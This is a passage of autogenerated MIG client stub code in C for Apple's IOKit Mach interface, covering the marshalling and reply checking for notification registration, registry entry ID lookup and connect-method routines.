		mach_msg_type_number_t referenceCnt;
		io_user_reference_t reference[8];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_service_add_notification_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_add_notification_t__defined */

	__DeclareSendRpc(2868, "io_service_add_notification")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t wake_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		20,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->wake_port = wake_portTemplate;
	InP->wake_port.name = wake_port;
#else	/* UseStaticTemplates */
	InP->wake_port.name = wake_port;
	InP->wake_port.disposition = 20;
	InP->wake_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->notification_typeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->notification_type, notification_type, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->notification_typeCnt = (mach_msg_type_number_t) mig_strncpy(InP->notification_type, notification_type, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->notification_typeOffset = 0;

	msgh_size_delta = _WALIGN_(InP->notification_typeCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 704) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->matchingCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->matching, matching, 512);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->matchingCnt = (mach_msg_type_number_t) mig_strncpy(InP->matching, matching, 512);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->matchingOffset = 0;

	msgh_size_delta = _WALIGN_(InP->matchingCnt);
	msgh_size += msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 512);

	if (referenceCnt > 8) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->reference, (const char *) reference, 8 * referenceCnt);

	InP->referenceCnt = referenceCnt;

	msgh_size += (8 * referenceCnt);
	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2868;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2868, "io_service_add_notification")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2868, "io_service_add_notification")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_add_notification_t__defined)
	check_result = __MIG_check__Reply__io_service_add_notification_t((__Reply__io_service_add_notification_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_add_notification_t__defined) */

	*notification = Out0P->notification.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_add_interest_notification_t__defined)
#define __MIG_check__Reply__io_service_add_interest_notification_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_add_interest_notification_t(__Reply__io_service_add_interest_notification_t *Out0P)
{

	typedef __Reply__io_service_add_interest_notification_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2969) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->notification.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->notification.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_add_interest_notification_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_add_interest_notification */
mig_external kern_return_t io_service_add_interest_notification
(
	mach_port_t service,
	io_name_t type_of_interest,
	mach_port_t wake_port,
	io_async_ref64_t reference,
	mach_msg_type_number_t referenceCnt,
	mach_port_t *notification
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t wake_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t type_of_interestOffset; /* MiG doesn't use it */
		mach_msg_type_number_t type_of_interestCnt;
		char type_of_interest[128];
		mach_msg_type_number_t referenceCnt;
		io_user_reference_t reference[8];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_service_add_interest_notification_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_add_interest_notification_t__defined */

	__DeclareSendRpc(2869, "io_service_add_interest_notification")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t wake_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		20,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->wake_port = wake_portTemplate;
	InP->wake_port.name = wake_port;
#else	/* UseStaticTemplates */
	InP->wake_port.name = wake_port;
	InP->wake_port.disposition = 20;
	InP->wake_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->type_of_interestCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->type_of_interest, type_of_interest, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->type_of_interestCnt = (mach_msg_type_number_t) mig_strncpy(InP->type_of_interest, type_of_interest, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->type_of_interestOffset = 0;

	msgh_size_delta = _WALIGN_(InP->type_of_interestCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 192) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	if (referenceCnt > 8) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->reference, (const char *) reference, 8 * referenceCnt);

	InP->referenceCnt = referenceCnt;

	msgh_size += (8 * referenceCnt);
	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2869;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2869, "io_service_add_interest_notification")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2869, "io_service_add_interest_notification")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_add_interest_notification_t__defined)
	check_result = __MIG_check__Reply__io_service_add_interest_notification_t((__Reply__io_service_add_interest_notification_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_add_interest_notification_t__defined) */

	*notification = Out0P->notification.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_add_notification_ool_t__defined)
#define __MIG_check__Reply__io_service_add_notification_ool_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_add_notification_ool_t(__Reply__io_service_add_notification_ool_t *Out0P)
{

	typedef __Reply__io_service_add_notification_ool_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2970) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->notification.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->notification.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_add_notification_ool_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_add_notification_ool */
mig_external kern_return_t io_service_add_notification_ool
(
	mach_port_t master_port,
	io_name_t notification_type,
	io_buf_ptr_t matching,
	mach_msg_type_number_t matchingCnt,
	mach_port_t wake_port,
	io_async_ref64_t reference,
	mach_msg_type_number_t referenceCnt,
	kern_return_t *result,
	mach_port_t *notification
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t matching;
		mach_msg_port_descriptor_t wake_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t notification_typeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t notification_typeCnt;
		char notification_type[128];
		mach_msg_type_number_t matchingCnt;
		mach_msg_type_number_t referenceCnt;
		io_user_reference_t reference[8];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_service_add_notification_ool_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_add_notification_ool_t__defined */

	__DeclareSendRpc(2870, "io_service_add_notification_ool")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t matchingTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_PHYSICAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t wake_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		20,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 2;
#if	UseStaticTemplates
	InP->matching = matchingTemplate;
	InP->matching.address = (void *)(matching);
	InP->matching.size = matchingCnt;
#else	/* UseStaticTemplates */
	InP->matching.address = (void *)(matching);
	InP->matching.size = matchingCnt;
	InP->matching.deallocate =  FALSE;
	InP->matching.copy = MACH_MSG_PHYSICAL_COPY;
	InP->matching.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

#if	UseStaticTemplates
	InP->wake_port = wake_portTemplate;
	InP->wake_port.name = wake_port;
#else	/* UseStaticTemplates */
	InP->wake_port.name = wake_port;
	InP->wake_port.disposition = 20;
	InP->wake_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->notification_typeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->notification_type, notification_type, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->notification_typeCnt = (mach_msg_type_number_t) mig_strncpy(InP->notification_type, notification_type, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->notification_typeOffset = 0;

	msgh_size_delta = _WALIGN_(InP->notification_typeCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 192) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	InP->matchingCnt = matchingCnt;

	if (referenceCnt > 8) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->reference, (const char *) reference, 8 * referenceCnt);

	InP->referenceCnt = referenceCnt;

	msgh_size += (8 * referenceCnt);
	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2870;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2870, "io_service_add_notification_ool")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2870, "io_service_add_notification_ool")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_add_notification_ool_t__defined)
	check_result = __MIG_check__Reply__io_service_add_notification_ool_t((__Reply__io_service_add_notification_ool_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_add_notification_ool_t__defined) */

	*result = Out0P->result;

	*notification = Out0P->notification.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_registry_entry_id_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_registry_entry_id_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_registry_entry_id_t(__Reply__io_registry_entry_get_registry_entry_id_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_registry_entry_id_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2971) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_registry_entry_id_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_registry_entry_id */
mig_external kern_return_t io_registry_entry_get_registry_entry_id
(
	mach_port_t registry_entry,
	uint64_t *entry_id
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t entry_id;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t entry_id;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_registry_entry_get_registry_entry_id_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_registry_entry_id_t__defined */

	__DeclareSendRpc(2871, "io_registry_entry_get_registry_entry_id")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2871;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2871, "io_registry_entry_get_registry_entry_id")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2871, "io_registry_entry_get_registry_entry_id")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_registry_entry_id_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_registry_entry_id_t((__Reply__io_registry_entry_get_registry_entry_id_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_registry_entry_id_t__defined) */

	*entry_id = Out0P->entry_id;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_connect_method_var_output_t__defined)
#define __MIG_check__Reply__io_connect_method_var_output_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_connect_method_var_output_t(__Reply__io_connect_method_var_output_t *Out0P, __Reply__io_connect_method_var_output_t **Out1PP, __Reply__io_connect_method_var_output_t **Out2PP)
{

	typedef __Reply__io_connect_method_var_output_t __Reply __attribute__((unused));
	__Reply *Out1P;
	__Reply *Out2P;
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 2972) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 4224) || msgh_size > (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->var_output.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	msgh_size_delta = _WALIGN_(Out0P->inband_outputCnt);
#if	__MigTypeCheck
	if ( Out0P->inband_outputCnt > 4096 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 4224))< Out0P->inband_outputCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 4224) + _WALIGN_(Out0P->inband_outputCnt)))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 4096);

	msgh_size_delta = Out1P->scalar_outputCnt * 8;
#if	__MigTypeCheck
	if ( Out1P->scalar_outputCnt > 16 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 4224)) / 8< Out1P->scalar_outputCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 4224) + Out1P->scalar_outputCnt * 8))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	*Out2PP = Out2P = (__Reply *) ((pointer_t) Out1P + msgh_size_delta - 128);

#if __MigTypeCheck
	if (Out0P->var_output.size != Out2P->var_outputCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_connect_method_var_output_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_connect_method_var_output */
mig_external kern_return_t io_connect_method_var_output
(
	mach_port_t connection,
	uint32_t selector,
	io_scalar_inband64_t scalar_input,
	mach_msg_type_number_t scalar_inputCnt,
	io_struct_inband_t inband_input,
	mach_msg_type_number_t inband_inputCnt,
	mach_vm_address_t ool_input,
	mach_vm_size_t ool_input_size,
	io_struct_inband_t inband_output,
	mach_msg_type_number_t *inband_outputCnt,
	io_scalar_inband64_t scalar_output,
	mach_msg_type_number_t *scalar_outputCnt,
	io_buf_ptr_t *var_output,
